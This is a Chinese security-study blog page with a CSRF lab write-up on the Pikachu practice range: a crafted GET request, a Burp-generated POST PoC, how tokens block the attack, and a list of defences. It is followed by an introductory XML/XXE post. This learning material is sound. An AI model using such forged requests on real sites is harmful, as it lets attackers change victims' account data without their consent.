</ul>
<p><strong>CSRF与XSS的区别</strong></p>
<p>XSS攻击中，攻击者确确实实拿到了被害者的身份验证信息，即<strong>直接盗取了用户的权限</strong>。而CSRF攻击过程中，攻击者<strong>实际上并未切实拿到被害者权限</strong>，而是而是被害者自己“主动”发送的，颇有一种借刀杀人的感觉。</p>
<h2 id="CSRF攻击过程示例"><a href="#CSRF攻击过程示例" class="headerlink" title="CSRF攻击过程示例"></a>CSRF攻击过程示例</h2><p>这里以Pikachu靶场的三道题目进行演示：</p>
<h3 id="CSRF-GET"><a href="#CSRF-GET" class="headerlink" title="CSRF(GET)"></a>CSRF(GET)</h3><p>随便登陆一个用户账号，修改信息时抓包查看，</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET <span class="keyword">/vul/</span>csrf<span class="keyword">/csrfget/</span>csrf_get_edit.php?<span class="attr">sex</span><span class="operator">=</span>boy<span class="variable">&amp;phonenum</span>=<span class="number">15988767673</span><span class="variable">&amp;add</span>=hacker<span class="variable">&amp;email</span>=kobe%<span class="number">40</span>pikachu.com<span class="variable">&amp;submit</span>=submit</span><br></pre></td></tr></table></figure>

<p>发现并没有token之类的认证手段。将这段URL适当修改，然后登录另一个账户，点击点击刚刚构造好的URL来模拟该用户被攻击，发现该用户的信息被成功修改成了我们想要的情况。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250413210824877.png" alt="image-20250413210824877"></p>
<h3 id="CSRF-POST"><a href="#CSRF-POST" class="headerlink" title="CSRF(POST)"></a>CSRF(POST)</h3><p>发现修改信息被放在了POST请求体中，那么就无法像GET型一样直接构造恶意URL了。</p>
<p>但我们可以自己建一个网站，修改相关参数发送请求抓包后自己写一个html页面，诱导受害者进行点击等操作从而发送了恶意的POST请求修改了数据。</p>
<p>而BP中就有相关功能可以根据请求包直接生成可用的CSRF PoC:</p>
<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250414210324500.png" alt="image-20250414210324500"></p>
<p>生成之后点击测试一下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250414210545681.png" alt="image-20250414210545681"></p>
<p>点击提交按钮后发现信息被成功修改。</p>
<h3 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h3><p>抓包发现有token验证：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250414210914121.png" alt="image-20250414210914121"></p>
<p>查看源码即可发现，token发现Tokenmeici发送请求后会被和Session中的Token值进行比较，相同才会修改成功</p>
<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250414213540245.png" alt="image-20250414213540245"></p>
<p>，并且在修改之后还会重新生成一个新的值放在html的隐藏标签中。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250414213447382.png" alt="image-20250414213447382"></p>
<p>只要生成的Token足够随机，就会在一定程度上防止了CSRF攻击。</p>
<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
<li><p>每次设置随机Token</p>
</li>
<li><p>二次验证</p>
<p>例如：修改账号密码，需要判断旧密码。</p>
</li>
<li><p>Referer监测</p>
<p>检测跳转的站点是否符合规范。</p>
</li>
</ol>
<p>这三种措施若同时使用基本可以杜绝CSRF攻击。</p>
<p>参考文章：</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Mchacha/p/18184186">CSRF(Pikachu靶场练习) - machacha - 博客园</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/dogecheng/p/11583412.html">Pikachu漏洞练习平台实验——CSRF（三） - 那少年和狗 - 博客园</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/XML%20XPath%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8AXXE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/wz.jpg">
      <meta itemprop="name" content="y@7q">
      <meta itemprop="description" content="心不畏死，踏屍前行">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="y@7q">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/web%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/XML%20XPath%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8AXXE/" class="post-title-link" itemprop="url">XML XPath注入以及XXE</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-04-11 21:12:40" itemprop="dateCreated datePublished" datetime="2025-04-11T21:12:40+08:00">2025-04-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-04-17 22:40:58" itemprop="dateModified" datetime="2025-04-17T22:40:58+08:00">2025-04-17</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%90%AD%E5%BB%BA/" itemprop="url" rel="index"><span itemprop="name">基础知识搭建</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>327</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="XML、XPath注入以及XXE"><a href="#XML、XPath注入以及XXE" class="headerlink" title="XML、XPath注入以及XXE"></a>XML、XPath注入以及XXE</h1><h2 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a>什么是XML</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/6483">从XML相关一步一步到XXE漏洞-先知社区</a></p>
<p>XXE(XML External Entity Injection)全称为XML外部实体注入。想要了解XXE首先得了解XML。</p>
<h3 id="XML与HTML的区别"><a href="#XML与HTML的区别" class="headerlink" title="XML与HTML的区别"></a>XML与HTML的区别</h3><ul>
<li><p>XML被设计为传输和存储数据，其焦点是数据的内容。</p>
</li>
<li><p>HTML被设计用来显示数据，其焦点是数据的外观。</p>
</li>
</ul>
<h3 id="实体引用"><a href="#实体引用" class="headerlink" title="实体引用"></a>实体引用</h3><p>和HTML一样，XML也具有实体引用，类似于转义特殊符号。XML 中有 5 个预定义的实体引用：</p>
<table>
<thead>
<tr>
<th>&amp;lt;</th>
<th>&lt;</th>
<th>小于</th>
</tr>
</thead>
<tbody><tr>
<td>&amp;gt;</td>
<td>&gt;</td>
<td>大于</td>
</tr>
<tr>
<td>&amp;amp;</td>
<td>&amp;</td>
<td>和号</td>
</tr>
<tr>
<td>&amp;apos;</td>
<td>‘</td>
<td>省略号</td>
</tr>
<tr>
<td>&amp;quot;</td>
<td>“</td>
<td>引号</td>
</tr>
</tbody></table>
<p><a target="_blank" rel="noopener" href="http://www.dnslog.cn/">DNSLog Platform</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/mysticbinary/p/12668547.html">XXE漏洞原理、检测与修复 - Mysticbinary - 博客园</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="y@7q"
      src="/images/wz.jpg">
  <p class="site-author-name" itemprop="name">y@7q</p>
  <div class="site-description" itemprop="description">心不畏死，踏屍前行</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">34</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">32</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/yatq21" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yatq21" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:yatqqwer@gmail.com" title="E-Mail → mailto:yatqqwer@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">y@7q</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="站点总字数">136k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">2:04</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>


<span id="timeDate">载入天数...</span>
<span id="times">载入时分秒...</span>
<script>
    var now = new Date();
    function createtime() {
        var grt= new Date("04/03/2025 10:00:00"); //修改为你的网站开始运行的时间
        now.setTime(now.getTime()+250);
        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒.";
    }
setInterval("createtime()",250);
</script>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  
  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
